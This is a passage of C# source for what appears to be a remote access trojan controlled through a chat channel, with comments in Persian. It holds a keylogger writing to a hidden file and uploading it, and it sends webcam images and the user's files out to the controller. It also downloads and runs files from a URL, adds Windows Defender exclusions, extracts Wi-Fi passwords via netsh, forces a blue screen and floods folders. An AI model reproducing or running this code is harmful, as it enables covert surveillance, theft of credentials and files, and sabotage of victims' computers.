                    await SendMessageAsync($"\n{Environment.UserName} - " + ipInfo.country + "  " + flagEmoji, replyChannelId);
                }
                else
                {
                    await SendMessageAsync("Country: Unable to determine country !", replyChannelId);
                }
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync("Country: Error retrieving country info: " + ex.Message, replyChannelId);
        }
    }

    #region bsod
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
    #endregion
    private static async Task Bsod(ulong replyChannelId)
    {
        try
        {
            if (IsAdministrator())
            {
                await SendMessageAsync("☠️ Windows Fuck OFF ☠️", replyChannelId);
                System.Diagnostics.Process.EnterDebugMode();
                RtlSetProcessIsCritical(1, 0, 0);
                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }
            else
            {
                await SendMessageAsync($"```admin required```", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync(ex.Message, replyChannelId);
        }
    }
    private static async Task StopCreatingFoldersAsync(ulong replyChannelId, string path)
    {
        try
        {
            // تنظیم وضعیت اجرای عملیات به false تا حلقه while در متد StartCreatingFoldersAsync متوقف شود
            isfRunning = false;
            await SendMessageAsync("Folder Bomber Stopped !", replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error :{ex.Message}", replyChannelId);
        }
    }

    private static bool isfRunning = false; // تعریف ویژگی isRunning
    private static async Task StartCreatingFoldersAsync(ulong replyChannelId, string path)
    {
        try
        {
            int folderCount = 0;
            isfRunning = true;

            while (isfRunning)
            {
                // ایجاد 20 پوشه تصادفی
                for (int i = 0; i < 30; i++)
                {
                    string folderName = Path.Combine(path, Path.GetRandomFileName());
                    try
                    {
                        Directory.CreateDirectory(folderName);
                        folderCount++;
                    }
                    catch (Exception) { /* نادیده گرفتن خطاها */ }
                }
                await Task.Delay(100); // صبر 0.1 ثانیه
            }
            if (isfRunning == false)
            {
                await SendMessageAsync($"{folderCount} Folder Created !", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error :{ex.Message}", replyChannelId);
        }
    }

    #region keyLogger
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);

    private static string verifyKey(int code)
    {

        String key = "";

        if (code == 8) key = "[Back]";
        else if (code == 9) key = "[TAB]";
        else if (code == 13) key = "[Enter]";
        else if (code == 19) key = "[Pause]";
        else if (code == 20) key = "[Caps Lock]";
        else if (code == 27) key = "[Esc]";
        else if (code == 32) key = "[Space]";
        else if (code == 33) key = "[Page Up]";
        else if (code == 34) key = "[Page Down]";
        else if (code == 35) key = "[End]";
        else if (code == 36) key = "[Home]";
        else if (code == 37) key = "Left]";
        else if (code == 38) key = "[Up]";
        else if (code == 39) key = "[Right]";
        else if (code == 40) key = "[Down]";
        else if (code == 44) key = "[Print Screen]";
        else if (code == 45) key = "[Insert]";
        else if (code == 46) key = "[Delete]";
        else if (code == 48) key = "0";
        else if (code == 49) key = "1";
        else if (code == 50) key = "2";
        else if (code == 51) key = "3";
        else if (code == 52) key = "4";
        else if (code == 53) key = "5";
        else if (code == 54) key = "6";
        else if (code == 55) key = "7";
        else if (code == 56) key = "8";
        else if (code == 57) key = "9";
        else if (code == 65) key = "a";
        else if (code == 66) key = "b";
        else if (code == 67) key = "c";
        else if (code == 68) key = "d";
        else if (code == 69) key = "e";
        else if (code == 70) key = "f";
        else if (code == 71) key = "g";
        else if (code == 72) key = "h";
        else if (code == 73) key = "i";
        else if (code == 74) key = "j";
        else if (code == 75) key = "k";
        else if (code == 76) key = "l";
        else if (code == 77) key = "m";
        else if (code == 78) key = "n";
        else if (code == 79) key = "o";
        else if (code == 80) key = "p";
        else if (code == 81) key = "q";
        else if (code == 82) key = "r";
        else if (code == 83) key = "s";
        else if (code == 84) key = "t";
        else if (code == 85) key = "u";
        else if (code == 86) key = "v";
        else if (code == 87) key = "w";
        else if (code == 88) key = "x";
        else if (code == 89) key = "y";
        else if (code == 90) key = "z";
        else if (code == 91) key = "[Windows]";
        else if (code == 92) key = "[Windows]";
        else if (code == 93) key = "[List]";
        else if (code == 96) key = "0";
        else if (code == 97) key = "1";
        else if (code == 98) key = "2";
        else if (code == 99) key = "3";
        else if (code == 100) key = "4";
        else if (code == 101) key = "5";
        else if (code == 102) key = "6";
        else if (code == 103) key = "7";
        else if (code == 104) key = "8";
        else if (code == 105) key = "9";
        else if (code == 106) key = "*";
        else if (code == 107) key = "+";
        else if (code == 109) key = "-";
        else if (code == 110) key = ",";
        else if (code == 111) key = "/";
        else if (code == 112) key = "[F1]";
        else if (code == 113) key = "[F2]";
        else if (code == 114) key = "[F3]";
        else if (code == 115) key = "[F4]";
        else if (code == 116) key = "[F5]";
        else if (code == 117) key = "[F6]";
        else if (code == 118) key = "[F7]";
        else if (code == 119) key = "[F8]";
        else if (code == 120) key = "[F9]";
        else if (code == 121) key = "[F10]";
        else if (code == 122) key = "[F11]";
        else if (code == 123) key = "[F12]";
        else if (code == 144) key = "[Num Lock]";
        else if (code == 145) key = "[Scroll Lock]";
        else if (code == 160) key = "[Shift]";
        else if (code == 161) key = "[Shift]";
        else if (code == 162) key = "[Ctrl]";
        else if (code == 163) key = "[Ctrl]";
        else if (code == 164) key = "[Alt]";
        else if (code == 165) key = "[Alt]";
        else if (code == 187) key = "=";
        else if (code == 186) key = "ç";
        else if (code == 188) key = ",";
        else if (code == 189) key = "-";
        else if (code == 190) key = ".";
        else if (code == 192) key = "'";
        else if (code == 191) key = ";";
        else if (code == 193) key = "/";
        else if (code == 194) key = ".";
        else if (code == 219) key = "´";
        else if (code == 220) key = "]";
        else if (code == 221) key = "[";
        else if (code == 222) key = "~";
        else if (code == 226) key = "\\";

        return key;
    }

    #endregion
    private static async Task startKeyLogger(ulong replyChannelId)
    {
        try
        {

            await SendMessageAsync("Keylogger Started ! for stop `stop_keylogger`", replyChannelId);
            await SendMessageAsync("\n`stop_keylogger`", replyChannelId);

            islogging = true;
            while (Program.islogging)
            {
                for (int i = 0; i < 255; i++)
                {
                    int key = GetAsyncKeyState(i);
                    if (key == 1 || key == 32769)
                    {
                        StreamWriter file = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\hju8i7go654z7gfd.txt", true);
                        File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\hju8i7go654z7gfd.txt", FileAttributes.Hidden);
                        file.Write(verifyKey(i));
                        file.Close();
                        break;
                    }
                }
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync(ex.Message, replyChannelId);
        }

    }
    public static bool islogging;

    private static async Task stopKeyLogger(ulong replyChannelId)
    {
        string tempPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\hju8i7go654z7gfd.txt";

        try
        {
            islogging = false;

            // Open file stream
            using (var fileStream = new FileStream(tempPath, FileMode.Open))
            {
                long fileSize = fileStream.Length;
                byte[] fileBytes = new byte[fileSize];

                // Read file bytes
                await fileStream.ReadAsync(fileBytes, 0, (int)fileSize);

                // Use MemoryStream to convert byte[] to Stream
                using (var memoryStream = new MemoryStream(fileBytes))
                {
                    // Send file as attachment
                    await SendFileAsync(memoryStream, "hju8i7go654z7gfd.txt", "Here's the file:", replyChannelId);
                }
            }
        }
        catch (Exception ex)
        {
            string errorMessage = $"Error occurred while sending the file: {ex.Message}";
            await SendMessageAsync(errorMessage, replyChannelId);
        }
        finally
        {
            // Delete the file after sending
            File.Delete(tempPath);
        }

    }
    public static async Task RemoveAdminAsync(ulong replyChannelId, string filePath)
    {
        try
        {
            // Get the key to the registry
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers", true);

            // Check if the key is null, if yes, the value is not set
            if (key != null)
            {
                // Check if the value exists in the registry
                if (key.GetValue(filePath) != null)
                {
                    // Delete the registry value
                    key.DeleteValue(filePath);

                    await SendMessageAsync($"File `{filePath}` is no longer set to run as administrator.", replyChannelId);
                }
                else
                {
                    await SendMessageAsync($"Warning: File `{filePath}` is not currently set to run as administrator.", replyChannelId);
                }
            }
            else
            {
                await SendMessageAsync($"Warning: No files are currently set to run as administrator.", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }

    public static async Task SetAdminAsync(ulong replyChannelId, string filePath)
    {
        try
        {
            // Check if the file exists
            if (File.Exists(filePath))
            {
                // Get the key to the registry
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers", true);

                // Check if the key is null, if yes create a new key
                if (key == null)
                {
                    key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers");
                }

                // Check if the value already exists in the registry
                if (key.GetValue(filePath) != null)
                {
                    await SendMessageAsync($"Warning: File `{filePath}` is already set to run as administrator.", replyChannelId);
                }
                else
                {
                    // Combine the file path with the "RUNASADMIN" flag
                    string registryValue = filePath + " RUNASADMIN";

                    // Set the registry value
                    key.SetValue(filePath, "RUNASADMIN");

                    await SendMessageAsync($"File `{filePath}` is set to always run as administrator.", replyChannelId);
                }

                // Check if the registry value was successfully set
                if (key.GetValue(filePath)?.ToString() == "RUNASADMIN")
                {
                    await SendMessageAsync($"File `{filePath}` is successfully set to run as administrator.", replyChannelId);
                }
                else
                {
                    await SendMessageAsync($"Error: Unable to set administrator privileges for file `{filePath}`.", replyChannelId);
                }
            }
            else
            {
                await SendMessageAsync($"Error: File `{filePath}` does not exist.", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }
    public static async Task HideTaskbar(ulong replyChannelId)
    {
        try
        {
            Taskbar.Hide();
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error Hide taskbar: {ex.Message}", replyChannelId);
        }
    }

    public static async Task ShowTaskbar(ulong replyChannelId)
    {
        try
        {
            Taskbar.Show();
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error show taskbar: {ex.Message}", replyChannelId);
        }
    }
    private static bool continueMinimize = false;
    private static async Task sMinimizeAllWindowsAsync(ulong replyChannelId)
    {
        try
        {
            await SendMessageAsync("Minimize Bomber Started for stop\n`stop_minimize`", replyChannelId);
            while (continueMinimize)
            {
                IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
                SendMessage(lHwnd, 0x111, (IntPtr)419, IntPtr.Zero);
                // Delay to avoid high CPU usage
                await Task.Delay(500);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }
    private static async Task CheckStartupAppsRegistry(ulong replyChannelId)
    {
        try
        {
            string runKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Run";

            using (RegistryKey runKey = Registry.CurrentUser.OpenSubKey(runKeyPath))
            {
                if (runKey == null)
                {
                    await SendMessageAsync("No startup apps found in the registry.", replyChannelId);
                    return;
                }

                string[] startupEntries = runKey.GetValueNames();

                if (startupEntries.Length == 0)
                {
                    await SendMessageAsync("No startup apps found in the registry.", replyChannelId);
                }
                else
                {
                    string content = $"List of startup apps in the registry:\n\n";
                    foreach (string entry in startupEntries)
                    {
                        string entryValue = runKey.GetValue(entry)?.ToString() ?? "Unknown";
                        content += $"{entry} - {entryValue}\n";
                    }

                    if (content.Length >= 1990)
                    {
                        await SendMessageAsync($"Too Long :/", replyChannelId);

                    }

                    else
                    {
                        await SendMessageAsync($"```{content}", replyChannelId);
                    }
                }
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error executing Explorer: {ex.Message}", replyChannelId);
        }
    }

    private static async Task ExecuteExplorer(string path, ulong replyChannelId)
    {
        try
        {
            if (Directory.Exists(path))
            {
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = "explorer.exe",
                    Arguments = path,
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Maximized
                };

                Process explorerProcess = new Process
                {
                    StartInfo = startInfo
                };

                explorerProcess.Start();

                await SendMessageAsync($"Explorer started for path: {path}", replyChannelId);
            }
            else
            {
                await SendMessageAsync($"Error: The specified path does not exist: {path}", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error executing Explorer: {ex.Message}", replyChannelId);
        }
    }
    private static async Task ChangeToVideos(ulong replyChannelId)
    {
        try
        {
            string userName = Environment.UserName;
            string localAppDataPath = Path.Combine("C:\\Users", userName, "Videos");

            if (Directory.Exists(localAppDataPath))
            {
                Directory.SetCurrentDirectory(localAppDataPath);
                await SendMessageAsync($"Changed to Videos folder: {localAppDataPath}", replyChannelId);
            }
            else
            {
                await SendMessageAsync("Videos folder not found.", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }
    private static async Task ChangeToPictures(ulong replyChannelId)
    {
        try
        {
            string userName = Environment.UserName;
            string localAppDataPath = Path.Combine("C:\\Users", userName, "Pictures");

            if (Directory.Exists(localAppDataPath))
            {
                Directory.SetCurrentDirectory(localAppDataPath);
                await SendMessageAsync($"Changed to Pictures folder: {localAppDataPath}", replyChannelId);
            }
            else
            {
                await SendMessageAsync("Pictures folder not found.", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }
    private static async Task ChangeToDesktop(ulong replyChannelId)
    {
        try
        {
            string userName = Environment.UserName;
            string localAppDataPath = Path.Combine("C:\\Users", userName, "Desktop");

            if (Directory.Exists(localAppDataPath))
            {
                Directory.SetCurrentDirectory(localAppDataPath);
                await SendMessageAsync($"Changed to Desktop folder: {localAppDataPath}", replyChannelId);
            }
            else
            {
                await SendMessageAsync("Desktop folder not found.", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }
    private static CancellationTokenSource downloadCancellationTokenSource;
    private static async Task AllDownloadFiles(ulong replyChannelId)
    {
        try
        {
            string directoryPath = Directory.GetCurrentDirectory();
            downloadCancellationTokenSource = new CancellationTokenSource();

            List<string> files = Directory.GetFiles(directoryPath).ToList();

            if (files.Count > 0)
            {
                await SendMessageAsync($"Downloading all files from directory: {directoryPath}...", replyChannelId);

                foreach (string filePath in files)
                {
                    if (downloadCancellationTokenSource.Token.IsCancellationRequested)
                    {
                        await SendMessageAsync("Download canceled.", replyChannelId);
                        return;
                    }

                    try
                    {
                        using (var stream = File.OpenRead(filePath))
                        {
                            // ارسال مستقیم فایل از طریق Stream به جای استفاده از MemoryStream
                            await SendFileAsync(stream, Path.GetFileName(filePath), $"File downloaded: {Path.GetFileName(filePath)}", replyChannelId);
                        }
                    }
                    catch (Exception ex)
                    {
                        await SendMessageAsync($"Error sending file {Path.GetFileName(filePath)}: {ex.Message}", replyChannelId);
                    }
                }

                await SendMessageAsync("All files downloaded successfully.", replyChannelId);
            }
            else
            {
                await SendMessageAsync($"No files found in directory: {directoryPath}", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error downloading files: {ex.Message}", replyChannelId);
        }

    }

    private static void StopDownload()
    {
        try
        {
            if (downloadCancellationTokenSource != null)
            {
                downloadCancellationTokenSource.Cancel();
                downloadCancellationTokenSource.Dispose();
            }
        }
        catch (Exception ex)
        {
        }
    }
    private static async Task SaveAndExecuteFile(ulong replyChannelId, string fileUrl)
    {
        try
        {
            string userName = Environment.UserName;
            string path = $@"C:\Users\{userName}\AppData\Local\rl";

            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
                await SendMessageAsync("The 'rl' directory has been created.", replyChannelId);
            }
            else
            {
                await SendMessageAsync("The 'rl' directory already exists.", replyChannelId);
            }

            using (WebClient webClient = new WebClient())
            {
                string fileName = Path.GetFileName(fileUrl);
                string filePath = $@"{path}\{fileName}";

                webClient.DownloadFile(fileUrl, filePath);
                await SendMessageAsync($"Download completed. File saved to '{filePath}'.", replyChannelId);

                Process.Start(filePath);
                await SendMessageAsync("🎁 File Started 🎁", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error in saving and executing file: {ex.Message}", replyChannelId);
        }
    }
    private static string GetProcessPathById(int processId)
    {
        try
        {
            using (Process process = Process.GetProcessById(processId))
            {
                string processPath = process.MainModule.FileName;
                return processPath;
            }
        }
        catch (Exception ex)
        {
            return string.Empty;
        }
    }
    private static async Task FindProcessLocation(ulong replyChannelId, string processIdentifier)
    {
        try
        {
            if (int.TryParse(processIdentifier, out int processId))
            {
                // If the input is a valid integer, assume it's a PID
                Process process = Process.GetProcessById(processId);
                string processPath = GetProcessPathById(process.Id);
                if (!string.IsNullOrEmpty(processPath))
                {
                    await SendMessageAsync($"Location of process with PID {processId}: {processPath}", replyChannelId);
                }
                else
                {
                    await SendMessageAsync($"Could not find the path for process with PID {processId}.", replyChannelId);
                }
            }
            else
            {
                // If it's not a valid integer, assume it's a process name
                Process[] processes = Process.GetProcessesByName(processIdentifier);

                if (processes.Length > 0)
                {
                    string processLocations = $"Locations of '{processIdentifier}':\n";
                    foreach (Process process in processes)
                    {
                        string processPath = GetProcessPathById(process.Id);
                        if (!string.IsNullOrEmpty(processPath))
                        {
                            processLocations += $"{process.ProcessName}: {processPath}\n";
                        }
                    }

                    if (processLocations.Length >= 1800)
                    {
                        byte[] locationsBytes = Encoding.UTF8.GetBytes(processLocations);
                        using (var locationsStream = new MemoryStream(locationsBytes))
                        {
                            string fileName = $"{processIdentifier}_locations.txt"; // Define file name
                            string message = $"Here are the locations of '{processIdentifier}':"; // Define message
                            await SendFileAsync(locationsStream, fileName, message, replyChannelId);
                        }
                    }
                    else
                    {
                        await SendMessageAsync($"```\n{processLocations}```", replyChannelId);
                    }
                }
                else
                {
                    await SendMessageAsync($"No process named '{processIdentifier}' is currently running.", replyChannelId);
                }
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }
    private static async Task ShowInstructions(ulong replyChannelId)
    {
        try
        {
            string instructions = "```Enter = 1\r\nSpace = 2\r\nTab = 3\r\nShift = 4\r\nCtrl = 5\r\nAlt = 6\r\nWindows = 7\r\nEsc = 8\r\nBackspace = 9\r\na = a\r\nb = b\r\n...";
            await SendMessageAsync(instructions, replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }
    private static async Task Key(ulong replyChannelId, string[] keys)
    {
        try
        {
            foreach (var key in keys)
            {
                SendKey(key);
            }
            string successfulMessage = $"send keys: {string.Join(", ", keys)}";
            await SendMessageAsync(successfulMessage, replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }

    private static void SendKey(string key)
    {
        switch (key.ToLower())
        {
            case "1":
                SendKeys.SendWait("{ENTER}");
                break;
            case "2":
                SendKeys.SendWait("{SPACE}");
                break;
            case "3":
                SendKeys.SendWait("{TAB}");
                break;
            case "4":
                SendKeys.SendWait("+");
                break; // کلید Shift
            case "5":
                SendKeys.SendWait("^");
                break; // کلید Ctrl
            case "6":
                SendKeys.SendWait("%");
                break; // کلید Alt
            case "7":
                SendKeys.SendWait("{LWIN}");
                break; // کلید Windows
            case "8":
                SendKeys.SendWait("{ESC}");
                break; // کلید Escape
            case "9":
                SendKeys.SendWait("{BACKSPACE}");
                break; // کلید Backspace
            case "a":
                SendKeys.SendWait("a");
                break;
            case "b":
                SendKeys.SendWait("b");
                break;
            case "c":
                SendKeys.SendWait("c");
                break;
            case "d":
                SendKeys.SendWait("d");
                break;
            case "e":
                SendKeys.SendWait("e");
                break;
            case "f":
                SendKeys.SendWait("f");
                break;
            case "g":
                SendKeys.SendWait("g");
                break;
            case "h":
                SendKeys.SendWait("h");
                break;
            case "i":
                SendKeys.SendWait("i");
                break;
            case "j":
                SendKeys.SendWait("j");
                break;
            case "k":
                SendKeys.SendWait("k");
                break;
            case "l":
                SendKeys.SendWait("l");
                break;
            case "m":
                SendKeys.SendWait("m");
                break;
            case "n":
                SendKeys.SendWait("n");
                break;
            case "o":
                SendKeys.SendWait("o");
                break;
            case "p":
                SendKeys.SendWait("p");
                break;
            case "q":
                SendKeys.SendWait("q");
                break;
            case "r":
                SendKeys.SendWait("r");
                break;
            case "s":
                SendKeys.SendWait("s");
                break;
            case "t":
                SendKeys.SendWait("t");
                break;
            case "u":
                SendKeys.SendWait("u");
                break;
            case "v":
                SendKeys.SendWait("v");
                break;
            case "w":
                SendKeys.SendWait("w");
                break;
            case "x":
                SendKeys.SendWait("x");
                break;
            case "z":
                SendKeys.SendWait("z");
                break;
            default:
                break;
        }
    }
    public static async Task ZipFolder(string folderPath, string zipPath, ulong replyChannelId)
    {
        try
        {
            ZipFile.CreateFromDirectory(folderPath, zipPath);

            long originalSize = new DirectoryInfo(folderPath).EnumerateFiles("*.*", SearchOption.AllDirectories).Sum(fi => fi.Length);
            long compressedSize = new FileInfo(zipPath).Length;

            double originalSizeMB = BytesToMegabytes(originalSize);
            double compressedSizeMB = BytesToMegabytes(compressedSize);

            string message = $"File compressed successfully!\nOriginal size: {originalSizeMB:F2} MB\nCompressed size: {compressedSizeMB:F2} MB";
            await SendMessageAsync(message, replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error compressing folder: {ex.Message}", replyChannelId);
        }
    }


    public static double BytesToMegabytes(long bytes)
    {
        return (bytes / 1024f) / 1024f;
    }
    private static async Task ChangeToLocalAppDataFolder(ulong replyChannelId)
    {
        try
        {
            string userName = Environment.UserName;
            string localAppDataPath = Path.Combine("C:\\Users", userName, "AppData", "Local");

            if (Directory.Exists(localAppDataPath))
            {
                Directory.SetCurrentDirectory(localAppDataPath);
                await SendMessageAsync($"Changed to Local AppData folder: {localAppDataPath}", replyChannelId);
            }
            else
            {
                await SendMessageAsync("Local AppData folder not found.", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }
    public static async Task CaptureAndSendWebcamImages(string webcamName, int imageCount, ulong replyChannelId)
    {
        try
        {
            FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            VideoCaptureDevice videoSource = null;

            foreach (FilterInfo device in videoDevices)
            {
                if (device.Name.Equals(webcamName, StringComparison.OrdinalIgnoreCase))
                {
                    videoSource = new VideoCaptureDevice(device.MonikerString);
                    break;
                }
            }

            if (videoSource == null)
            {
                await SendMessageAsync("Webcam not found.", replyChannelId);
                return;
            }

            int capturedCount = 0;
            var lastFrameTime = DateTime.Now;

            NewFrameEventHandler handler = null;
            handler = async (s, e) =>
            {
                // ارسال تصویر فقط در صورتی که حداقل 2000 میلی‌ثانیه از فریم قبلی گذشته باشد
                if ((DateTime.Now - lastFrameTime).TotalMilliseconds >= 2000)
                {
                    lastFrameTime = DateTime.Now;
                    try
                    {
                        using (Bitmap image = (Bitmap)e.Frame.Clone())
                        {
                            string timestamp = DateTime.Now.ToString("yyyyMMddHHmmss");
                            string tempImagePath = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid()}-{timestamp}.jpg");
                            image.Save(tempImagePath, System.Drawing.Imaging.ImageFormat.Jpeg);

                            using (FileStream imageStream = new FileStream(tempImagePath, FileMode.Open, FileAccess.Read))
                            {
                                string fileName = $"webcam_image_{timestamp}.jpg";
                                string message = "Here is a webcam image.";
                                await SendFileAsync(imageStream, fileName, message, replyChannelId);
                            }
                            File.Delete(tempImagePath);
                        }

                        capturedCount++;
                        if (capturedCount >= imageCount)
                        {
                            videoSource.NewFrame -= handler;
                            videoSource.SignalToStop();
                        }
                    }
                    catch (Exception ex)
                    {
                        await SendMessageAsync($"Error processing webcam image: {ex.Message}", replyChannelId);
                    }
                }
            };

            videoSource.NewFrame += handler;
            videoSource.Start();

            // انتظار تا زمانی که تعداد تصاویر مورد نظر دریافت شود
            while (capturedCount < imageCount)
            {
                await Task.Delay(500);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error capturing and sending webcam images: {ex.Message}", replyChannelId);
        }
    }

    public static async Task AddPathToWindowsDefenderExclusions(
        ulong replyChannelId,
        string path
    )
    {
        try
        {
            string powershellCommand = $"Add-MpPreference -ExclusionPath '{path}'";
            Process process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-Command {powershellCommand}",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };

            process.Start();
            string output = await process.StandardOutput.ReadToEndAsync();
            process.WaitForExit();

            if (process.ExitCode == 0)
            {
                await SendMessageAsync($"Path '{path}' has been added to Windows Defender exclusions.", replyChannelId);

            }
            else
            {
                await SendMessageAsync($"Failed to add path '{path}' to Windows Defender exclusions. PowerShell output: {output}", replyChannelId);

            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }

    private static string GetSSID()
    {
        try
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("root\\WMI", "SELECT * FROM MSNdis_80211_ServiceSetIdentifier");
            foreach (ManagementObject queryObj in searcher.Get())
            {
                byte[] ssidBytes = (byte[])queryObj["Ndis80211SsId"];
                return System.Text.Encoding.ASCII.GetString(ssidBytes);
            }
        }
        catch (Exception ex)
        {
            return ex.Message;
        }
        return "SSID not found";
    }

    // متد برای دریافت نام شبکه
    private static string GetNetworkName()
    {
        try
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.OperationalStatus == OperationalStatus.Up)
                {
                    return nic.Name;
                }
            }
        }
        catch (Exception ex)
        {
            return ex.Message;
        }
        return "Network not found";
    }

    // متد برای دریافت نام آداپتور شبکه
    private static string GetNetworkAdapterName()
    {
        try
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.OperationalStatus == OperationalStatus.Up)
                {
                    return nic.Description;
                }
            }
        }
        catch (Exception ex)
        {
            return ex.Message;
        }
        return "Network adapter not found";
    }

    // متد برای دریافت رمز شبکه (در صورت اتصال به وای‌فای)
    public static string GetWifiPassword()
    {
        try
        {
            // مرحله 1: شناسایی نام شبکه Wi-Fi فعلی
            string currentWifiName = GetCurrentWifiName();
            if (string.IsNullOrEmpty(currentWifiName))
            {
                return "null";
            }

            // مرحله 2: دریافت رمز عبور شبکه Wi-Fi
            var processStartInfo = new ProcessStartInfo("netsh", $"wlan show profile name=\"{currentWifiName}\" key=clear")
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (var process = new Process { StartInfo = processStartInfo })
            {
                process.Start();
                var output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                // جستجوی خطی که حاوی "Key Content" است و استخراج رمز عبور
                var keyLine = output.Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries)
                    .FirstOrDefault(line => line.Trim().StartsWith("Key Content"));

                return keyLine?.Split(new[] { ':' }, 2).Last().Trim() ?? "Password not found";
            }
        }
        catch (Exception ex)
        {
            return $"Error: {ex.Message}";
        }
    }

    private static string GetCurrentWifiName()
    {
        try
        {
            var processStartInfo = new ProcessStartInfo("netsh", "wlan show interfaces")
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (var process = new Process { StartInfo = processStartInfo })
            {
                process.Start();
                var output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                // جستجوی نام شبکه Wi-Fi فعلی
                var ssidLine = output.Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries)
                    .FirstOrDefault(line => line.Trim().StartsWith("SSID"));

                return ssidLine?.Split(new[] { ':' }, 2).Last().Trim() ?? string.Empty;
            }
        }
        catch (Exception ex)
        {
            return $"Error: {ex.Message}";
        }
    }

    // متد برای دریافت سرعت شبکه
    public static string GetNetworkSpeed()
    {
        try
        {
            // انتخاب اولین رابط شبکه فعال که شرایط مورد نظر را داشته باشد
            var nic = NetworkInterface.GetAllNetworkInterfaces()
                .FirstOrDefault(n =>
                    n.OperationalStatus == OperationalStatus.Up &&
                    n.NetworkInterfaceType != NetworkInterfaceType.Loopback &&
                    n.NetworkInterfaceType != NetworkInterfaceType.Tunnel &&
                    !n.Description.ToLower().Contains("virtual") &&
                    !n.Description.ToLower().Contains("vm"));

            if (nic == null)
                return "No active network interface found.";

            // دریافت آمار اولیه
            var initialStats = nic.GetIPv4Statistics();
            long initialBytesSent = initialStats.BytesSent;
            long initialBytesReceived = initialStats.BytesReceived;

            // اندازه‌گیری زمان دقیق به کمک Stopwatch
            var stopwatch = Stopwatch.StartNew();
            // انتظار به مدت 1 ثانیه (برای دقت بیشتر)
            Thread.Sleep(1000);
            stopwatch.Stop();

            double elapsedSeconds = stopwatch.Elapsed.TotalSeconds;

            // دریافت آمار نهایی
            var finalStats = nic.GetIPv4Statistics();
            long finalBytesSent = finalStats.BytesSent;
            long finalBytesReceived = finalStats.BytesReceived;

            // محاسبه تعداد بایت‌های انتقال یافته
            long sentBytes = finalBytesSent - initialBytesSent;
            long receivedBytes = finalBytesReceived - initialBytesReceived;
            long totalBytes = sentBytes + receivedBytes;

            // تبدیل بایت به بیت (ضرب در 8) و سپس به مگابیت بر ثانیه (تقسیم بر 1024*1024)
            double speedInMbps = (totalBytes * 8.0) / (elapsedSeconds * 1024 * 1024);

            return speedInMbps.ToString("0.00") + " Mbps";
        }
        catch (Exception ex)
        {
            return "Error: " + ex.Message;
        }
    }

    // متد برای دریافت آی‌پی محلی
    private static string GetLocalIPAddress()
    {
        try
        {
